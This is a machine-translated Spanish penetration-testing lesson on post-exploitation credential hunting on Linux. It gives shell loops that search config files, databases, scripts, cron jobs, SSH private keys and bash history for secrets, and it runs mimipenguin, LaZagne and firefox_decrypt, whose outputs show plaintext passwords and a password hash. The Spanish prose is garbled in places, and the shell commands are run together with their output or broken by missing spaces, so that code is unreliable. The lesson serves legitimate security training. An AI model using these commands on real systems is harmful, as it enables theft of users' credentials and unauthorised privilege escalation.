# Cedencial de caza en Linux

La caza de credenciales es uno de los primeros pasos una vez que tenemos acceso al sistema. Estas frutas bajas pueden darnos privilegios elevados en segundos o minutos. Entre otras cosas, esto es parte del proceso de escalada de privilegios locales que cubriremos aquí. Sin embargo, es importante tener en cuenta aquí que estamos lejos de cubrir todas las situaciones posibles y, por lo tanto, centrarnos en los diferentes enfoques.

Podemos imaginar que hemos obtenido con éxito acceso a un sistema a través de una aplicación web vulnerable y, por lo tanto, hemos obtenido un shell inverso, por ejemplo. Por lo tanto, para escalar nuestros privilegios de manera más eficiente, podemos buscar contraseñas o incluso credenciales completas que podemos usar para iniciar sesión en nuestro objetivo. Hay varias fuentes que pueden proporcionarnos credenciales que ponemos en cuatro categorías. Estos incluyen, pero no se limitan a:

| **`Files`** | **`History`** | **`Memory`** | **`Key-Rings`** |
| --- | --- | --- | --- |
| Configuraciones | Registro | Cache | Credenciales almacenadas del navegador |
| Bases de datos | Historia de la línea de comandos | Procesamiento en memoria |  |
| Notas |  |  |  |
| Guiones |  |  |  |
| Códigos de origen |  |  |  |
| Cronjobs |  |  |  |
| Llaves ssh |  |  |  |

Enumerar todas estas categorías nos permitirá aumentar la probabilidad de descubrir con éxito con algunas credenciales facilitadas de los usuarios existentes en el sistema. Hay innumerables situaciones diferentes en las que siempre veremos diferentes resultados. Por lo tanto, debemos adaptar nuestro enfoque a las circunstancias del medio ambiente y tener en cuenta el panorama general. Sobre todo, es crucial tener en cuenta cómo funciona el sistema, su enfoque, para qué propósito existe y qué papel juega en la lógica comercial y la red general. Por ejemplo, suponga que es un servidor de base de datos aislado. En ese caso, no necesariamente encontraremos usuarios normales allí, ya que es una interfaz confidencial en la administración de datos a la que solo unas pocas personas tienen acceso.

---

# **Archivos**

Un principio central de Linux es que todo es un archivo. Por lo tanto, es crucial tener en cuenta este concepto y buscar, encontrar y filtrar los archivos apropiados de acuerdo con nuestros requisitos. Debemos buscar, encontrar e inspeccionar varias categorías de archivos uno por uno. Estas categorías son las siguientes:

|  |  |  |
| --- | --- | --- |
| Archivos de configuración | Bases de datos | Notas |
| Guiones | Cronjobs | Llaves ssh |

Los archivos de configuración son el núcleo de la funcionalidad de los servicios en las distribuciones de Linux. A menudo incluso contienen credenciales que podremos leer. Su conocimiento también nos permite comprender cómo funciona el servicio y sus requisitos con precisión. Por lo general, los archivos de configuración están marcados con las siguientes tres extensiones de archivo (`.config`, `.conf`, `.cnf`). Sin embargo, estos archivos de configuración o los archivos de extensión asociados se pueden renunciar, lo que significa que estas extensiones de archivos no son necesariamente necesarias. Además, incluso cuando se recompensa un servicio, se puede cambiar el nombre de archivo requerido para la configuración básica, lo que daría como resultado el mismo efecto. Sin embargo, este es un caso raro que no encontraremos a menudo, pero esta posibilidad no debe dejarse fuera de nuestra búsqueda.

La parte más crucial de cualquier enumeración del sistema es obtener una descripción general de la misma. Por lo tanto, el primer paso debe ser encontrar todos los archivos de configuración posibles en el sistema, que luego podemos examinar y analizar individualmente con más detalle. Hay muchos métodos para encontrar estos archivos de configuración, y con el siguiente método, veremos que hemos reducido nuestra búsqueda a estas tres extensiones de archivos.

### **Archivos de configuración**

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l2>/dev/null | grep -v "lib\|fonts\|share\|core" ;doneFile extension:  .conf
/run/tmpfiles.d/static-nodes.conf
/run/NetworkManager/resolv.conf
/run/NetworkManager/no-stub-resolv.conf
/run/NetworkManager/conf.d/10-globally-managed-devices.conf
...SNIP...
/etc/ltrace.conf
/etc/rygel.conf
/etc/ld.so.conf.d/x86_64-linux-gnu.conf
/etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/etc/fprintd.conf

File extension:  .config
/usr/src/linux-headers-5.13.0-27-generic/.config
/usr/src/linux-headers-5.11.0-27-generic/.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.13-headers-5.13.0-27/tools/power/acpi/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/perf/Makefile.config
/usr/src/linux-hwe-5.11-headers-5.11.0-27/tools/power/acpi/Makefile.config
/home/cry0l1t3/.config
/etc/X11/Xwrapper.config
/etc/manpath.config

File extension:  .cnf
/etc/ssl/openssl.cnf
/etc/alternatives/my.cnf
/etc/mysql/my.cnf
/etc/mysql/debian.cnf
/etc/mysql/mysql.conf.d/mysqld.cnf
/etc/mysql/mysql.conf.d/mysql.cnf
/etc/mysql/mysql.cnf
/etc/mysql/conf.d/mysqldump.cnf
/etc/mysql/conf.d/mysql.cnf

```

Opcionalmente, podemos guardar el resultado en un archivo de texto y usarlo para examinar los archivos individuales uno tras otro. Otra opción es ejecutar el escaneo directamente para cada archivo encontrado con la extensión del archivo especificada y emitir el contenido. En este ejemplo, buscamos tres palabras (`user`, `password`, `pass`) en cada archivo con la extensión del archivo`.cnf`.

### **Credenciales en archivos de configuración**

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ for i in $(find / -name *.cnf2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i2>/dev/null | grep -v "\#";doneFile:  /snap/core18/2128/etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /usr/share/ssl-cert/ssleay.cnf

File:  /etc/ssl/openssl.cnf
challengePassword		= A challenge password

File:  /etc/alternatives/my.cnf

File:  /etc/mysql/my.cnf

File:  /etc/mysql/debian.cnf

File:  /etc/mysql/mysql.conf.d/mysqld.cnf
user		= mysql

File:  /etc/mysql/mysql.conf.d/mysql.cnf

File:  /etc/mysql/mysql.cnf

File:  /etc/mysql/conf.d/mysqldump.cnf

File:  /etc/mysql/conf.d/mysql.cnf

```

También podemos aplicar esta búsqueda simple a las otras extensiones de archivo. Además, podemos aplicar este tipo de búsqueda a las bases de datos almacenadas en archivos con diferentes extensiones de archivos, y luego podemos leerlas.

### **Bases de datos**

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";doneDB File extension:  .sql

DB File extension:  .db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db

DB File extension:  .*db
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-card-database.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-device-volumes.tdb
/home/cry0l1t3/.config/pulse/3a1ee8276bbe4c8e8d767a2888fc2b1e-stream-volumes.tdb
/home/cry0l1t3/.cache/tracker/meta.db
/home/cry0l1t3/.cache/tracker/ontologies.gvdb

DB File extension:  .db*
/var/cache/dictionaries-common/ispell.db
/var/cache/dictionaries-common/aspell.db
/var/cache/dictionaries-common/wordlist.db
/var/cache/dictionaries-common/hunspell.db
/home/cry0l1t3/.dbus
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/cert9.db
/home/cry0l1t3/.mozilla/firefox/1bplpd86.default-release/key4.db
/home/cry0l1t3/.cache/tracker/meta.db-shm
/home/cry0l1t3/.cache/tracker/meta.db-wal
/home/cry0l1t3/.cache/tracker/meta.db

```

Dependiendo del entorno en el que estamos y el propósito del host en el que estamos, a menudo podemos encontrar notas sobre procesos específicos en el sistema. Estos a menudo incluyen listas de muchos puntos de acceso diferentes o incluso sus credenciales. Sin embargo, a menudo es difícil encontrar notas de inmediato si se almacena en algún lugar del sistema y no en el escritorio o en sus subcarpetas. Esto se debe a que se pueden nombrar cualquier cosa y no tienen que tener una extensión de archivo específica, como`.txt`. Por lo tanto, en este caso, necesitamos buscar archivos, incluido el`.txt`Extensión de archivo y archivos que no tienen extensión de archivo en absoluto.

### **Notas**

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ find /home/* -type f -name "*.txt" -o ! -name "*.*"/home/cry0l1t3/.config/caja/desktop-metadata
/home/cry0l1t3/.config/clipit/clipitrc
/home/cry0l1t3/.config/dconf/user
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/pkcs11.txt
/home/cry0l1t3/.mozilla/firefox/bh4w5vd0.default-esr/serviceworker.txt
...SNIP...

```

Los scripts son archivos que a menudo contienen información y procesos altamente confidenciales. Entre otras cosas, estas también contienen credenciales que son necesarias para poder llamar y ejecutar los procesos automáticamente. De lo contrario, el administrador o el desarrollador tendría que ingresar la contraseña correspondiente cada vez que se llame al script o al programa compilado.

### **Guiones**

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l2>/dev/null | grep -v "doc\|lib\|headers\|share";doneFile extension:  .py

File extension:  .pyc

File extension:  .pl

File extension:  .go

File extension:  .jar

File extension:  .c

File extension:  .sh
/snap/gnome-3-34-1804/72/etc/profile.d/vte-2.91.sh
/snap/gnome-3-34-1804/72/usr/bin/gettext.sh
/snap/core18/2128/etc/init.d/hwclock.sh
/snap/core18/2128/etc/wpa_supplicant/action_wpa.sh
/snap/core18/2128/etc/wpa_supplicant/functions.sh
...SNIP...
/etc/profile.d/xdg_dirs_desktop_session.sh
/etc/profile.d/cedilla-portuguese.sh
/etc/profile.d/im-config_wayland.sh
/etc/profile.d/vte-2.91.sh
/etc/profile.d/bash_completion.sh
/etc/profile.d/apps-bin-path.sh

```

Los Cronjobs son la ejecución independiente de comandos, programas, scripts. Estos se dividen en el área de todo el sistema (`/etc/crontab`) y ejecuciones dependientes del usuario. Algunas aplicaciones y scripts requieren que se ejecuten credenciales y, por lo tanto, se ingresan incorrectamente en los Cronjobs. Además, están las áreas que se dividen en diferentes rangos de tiempo (`/etc/cron.daily`, `/etc/cron.hourly`, `/etc/cron.monthly`, `/etc/cron.weekly`). Los scripts y archivos utilizados por`cron`También se puede encontrar en`/etc/cron.d/`para distribuciones basadas en Debian.

### **Cronjobs**

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ cat /etc/crontab# /etc/crontab: system-wide crontab# Unlike any other crontab you don't have to run the `crontab'# command to install the new version when you edit this file# and files in /etc/cron.d. These files also have username fields,# that none of the other crontabs do.SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name command to be executed17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly

```

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ ls -la /etc/cron.*//etc/cron.d/:
total 28
drwxr-xr-x 1 root root  106  3. Jan 20:27 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
-rw-r--r-- 1 root root  201  1. Mär 2021  e2scrub_all
-rw-r--r-- 1 root root  331  9. Jan 2021  geoipupdate
-rw-r--r-- 1 root root  607 25. Jan 2021  john
-rw-r--r-- 1 root root  589 14. Sep 2020  mdadm
-rw-r--r-- 1 root root  712 11. Mai 2020  php
-rw-r--r-- 1 root root  102 22. Feb 2021  .placeholder
-rw-r--r-- 1 root root  396  2. Feb 2021  sysstat

/etc/cron.daily/:
total 68
drwxr-xr-x 1 root root  252  6. Jan 16:24 .
drwxr-xr-x 1 root root 5728  1. Feb 00:06 ..
...SNIP...

```

### **Llaves ssh**

Las claves SSH pueden considerarse "tarjetas de acceso" para el protocolo SSH utilizado para el mecanismo de autenticación de la clave pública. Se genera un archivo para el cliente (`Private key`) y uno correspondiente para el servidor (`Public key`). Sin embargo, estos no son lo mismo, así que conocer el`public key`es insuficiente para encontrar un`private key`. El`public key`Puede verificar las firmas generadas por la tecla SSH privada y, por lo tanto, habilita el inicio de sesión automático al servidor. Incluso si las personas no autorizadas se apoderan de la clave pública, es casi imposible calcular el privado coincidente de ella. Al conectarse al servidor utilizando la tecla SSH privada, el servidor verifica si la clave privada es válida y permite que el cliente inicie sesión en consecuencia. Por lo tanto, las contraseñas ya no se necesitan para conectarse a través de SSH.

Dado que las claves SSH se pueden nombrar arbitrariamente, no podemos buscar en ellos nombres específicos. Sin embargo, su formato nos permite identificarlos de manera exclusiva porque, ya sea clave pública o clave privada, ambas tienen primeras líneas únicas para distinguirlos.

### **Cayos privados de SSH**

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ grep -rnw "PRIVATE KEY" /home/*2>/dev/null | grep ":1"/home/cry0l1t3/.ssh/internal_db:1:-----BEGIN OPENSSH PRIVATE KEY-----

```

### **Cayos públicos de SSH**

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ grep -rnw "ssh-rsa" /home/*2>/dev/null | grep ":1"/home/cry0l1t3/.ssh/internal_db.pub:1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCraK

```

---

# **Historia**

Todos los archivos de la historia proporcionan información crucial sobre el curso actual e histórico de los procesos. Estamos interesados en los archivos que almacenan el historial de comandos de los usuarios y los registros que almacenan información sobre los procesos del sistema.

En el historial de los comandos ingresados en distribuciones de Linux que usan Bash como un shell estándar, encontramos los archivos asociados en`.bash_history`. Sin embargo, otros archivos como`.bashrc`o`.bash_profile`puede contener información importante.

### **Historia de Bash**

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ tail -n5 /home/*/.bash*==> /home/cry0l1t3/.bash_history <==
vim ~/testing.txt
vim ~/testing.txt
chmod 755 /tmp/api.py
su
/tmp/api.py cry0l1t3 6mX4UP1eWH3HXK

==> /home/cry0l1t3/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi

```

### **Registro**

Un concepto esencial de los sistemas Linux son los archivos de registro que se almacenan en archivos de texto. Muchos programas, especialmente todos los servicios y el sistema en sí, escriben dichos archivos. En ellos, encontramos errores del sistema, detectamos problemas con respecto a los servicios o seguimos lo que el sistema está haciendo en segundo plano. La totalidad de los archivos de registro se puede dividir en cuatro categorías:

| **Registros de la aplicación** | **Registros de eventos** | **Registros de servicio** | **Registros del sistema** |
| --- | --- | --- | --- |

Existen muchos registros diferentes en el sistema. Estos pueden variar según las aplicaciones instaladas, pero estos son algunas de las más importantes:

| **Archivo de registro** | **Descripción** |
| --- | --- |
| `/var/log/messages` | Registros de actividad del sistema genérico. |
| `/var/log/syslog` | Registros de actividad del sistema genérico. |
| `/var/log/auth.log` | (Debian) Todos los registros relacionados con la autenticación. |
| `/var/log/secure` | (Redhat/CentOS) Todos los registros relacionados con la autenticación. |
| `/var/log/boot.log` | Información de arranque. |
| `/var/log/dmesg` | Información y registros relacionados con el hardware y los controladores. |
| `/var/log/kern.log` | Advertencias, errores y registros relacionados con el núcleo. |
| `/var/log/faillog` | Intentos de inicio de sesión fallidos. |
| `/var/log/cron` | Información relacionada con los trabajos cron. |
| `/var/log/mail.log` | Todos los registros relacionados con el servidor de correo. |
| `/var/log/httpd` | Todos los registros relacionados con Apache. |
| `/var/log/mysqld.log` | Todos los registros relacionados con el servidor MySQL. |

Cubrir el análisis de estos archivos de registro en detalle sería ineficiente en este caso. Entonces, en este punto, debemos familiarizarnos con los registros individuales, primero examinándolos manualmente y entendiendo sus formatos. Sin embargo, aquí hay algunas cadenas que podemos usar para encontrar contenido interesante en los registros:

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ for i in $(ls /var/log/*2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i2>/dev/null;fi;done#### Log file:  /var/log/dpkg.log.12022-01-10 17:57:41 install libssh-dev:amd64 <none> 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-installed libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 configure libssh-dev:amd64 0.9.5-1+deb11u1 <none>
2022-01-10 17:57:41 status unpacked libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status half-configured libssh-dev:amd64 0.9.5-1+deb11u1
2022-01-10 17:57:41 status installed libssh-dev:amd64 0.9.5-1+deb11u1

...SNIP...

```

---

# **Memoria y caché**

Muchas aplicaciones y procesos funcionan con credenciales necesarias para la autenticación y las almacenan en la memoria o en los archivos para que puedan reutilizarse. Por ejemplo, pueden ser las credenciales requeridas del sistema para los usuarios iniciados. Otro ejemplo son las credenciales almacenadas en los navegadores, que también se pueden leer. Para recuperar este tipo de información de las distribuciones de Linux, hay una herramienta llamada[mimipenguin](https://github.com/huntergregal/mimipenguin)Eso facilita todo el proceso. Sin embargo, esta herramienta requiere permisos de administrador/raíz.

### **Memoria - Mimipenguin**

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ sudo python3 mimipenguin.py[sudo] password for cry0l1t3:

[SYSTEM - GNOME]	cry0l1t3:WLpAEXFa0SbqOHY

cry0l1t3@unixclient:~$ sudo bash mimipenguin.sh [sudo] password for cry0l1t3:

MimiPenguin Results:
[SYSTEM - GNOME]          cry0l1t3:WLpAEXFa0SbqOHY

```

Una herramienta aún más poderosa que podemos usar que se mencionó anteriormente en la caza de credenciales en la sección de Windows es`LaZagne`. Esta herramienta nos permite acceder a muchos más recursos y extraer las credenciales. Las contraseñas y hashes que podemos obtener provienen de las siguientes fuentes, pero no se limitan a:

|  |  |  |  |
| --- | --- | --- | --- |
| Wifi | WPA_Supplicant | Libsecret | Kwallet |
| Basado en el cromo | CLI | Mozilla | Trueno |
| Git | Env_variable | Comida | Fstab |
| AWS | Filezilla | GFTP | Ssh |
| apache | Sombra | Estibador | Conserva |
| Mimipy | Sesiones | Llave |  |

Por ejemplo,`Keyrings`se utilizan para el almacenamiento seguro y la gestión de contraseñas en las distribuciones de Linux. Las contraseñas se almacenan encriptadas y protegidas con una contraseña maestra. Es un administrador de contraseñas basado en el sistema operativo, que discutiremos más adelante en otra sección. De esta manera, no necesitamos recordar cada contraseña y podemos guardar las entradas de contraseña repetidas.

### **Memoria - Lazagne**

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ sudo python2.7 laZagne.py all|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
Hash:$6$wgK4tGq7Jepa.V0g$QkxvseL.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY

[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418

```

### **Navegadores**

Los navegadores almacenan las contraseñas guardadas por el usuario en un formulario encriptado localmente en el sistema que se reutilizará. Por ejemplo, el`Mozilla Firefox`El navegador almacena las credenciales encriptadas en una carpeta oculta para el usuario respectivo. Estos a menudo incluyen los nombres de campo asociados, las URL y otra información valiosa.

Por ejemplo, cuando almacenamos credenciales para una página web en el navegador Firefox, están encriptados y almacenados en`logins.json`en el sistema. Sin embargo, esto no significa que estén a salvo allí. Muchos empleados almacenan datos de inicio de sesión en su navegador sin sospechar que se puede descifrarse y usarse fácilmente contra la empresa.

### **Credenciales almacenadas de Firefox**

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ ls -l .mozilla/firefox/ | grep default drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default

```

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .{
  "nextId": 2,
  "logins": [
    {
      "id": 1,
      "hostname": "https://www.inlanefreight.com",
      "httpRealm": null,
      "formSubmitURL": "https://www.inlanefreight.com",
      "usernameField": "username",
      "passwordField": "password",
      "encryptedUsername": "MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr",
      "encryptedPassword": "MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=",
      "guid": "{412629aa-4113-4ff9-befe-dd9b4ca388e2}",
      "encType": 1,
      "timeCreated": 1643373110869,
      "timeLastUsed": 1643373110869,
      "timePasswordChanged": 1643373110869,
      "timesUsed": 1
    }
  ],
  "potentiallyVulnerablePasswords": [],
  "dismissedBreachAlertsByLoginGUID": {},
  "version": 3
}

```

La herramienta[Firefox descifrar](https://github.com/unode/firefox_decrypt)es excelente para descifrar estas credenciales y se actualiza regularmente. Requiere Python 3.9 para ejecutar la última versión. De lo contrario,`Firefox Decrypt 0.7.0`con Python 2 debe usarse.

### **Descifrar credenciales de Firefox**

Cedencial de caza en Linux

```
xnoxos@htb[/htb]$ python3.9 firefox_decrypt.pySelect the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

2

Website:   https://testing.dev.inlanefreight.com
Username: 'test'
Password: 'test'

Website:   https://www.inlanefreight.com
Username: 'cry0l1t3'
Password: 'FzXUxJemKm6g2lGh'

```

Alternativamente,`LaZagne`También puede devolver los resultados si el usuario ha utilizado el navegador compatible.

### **Navegadores - Lazagne**

Cedencial de caza en Linux

```
cry0l1t3@unixclient:~$ python3 laZagne.py browsers|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh

[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
```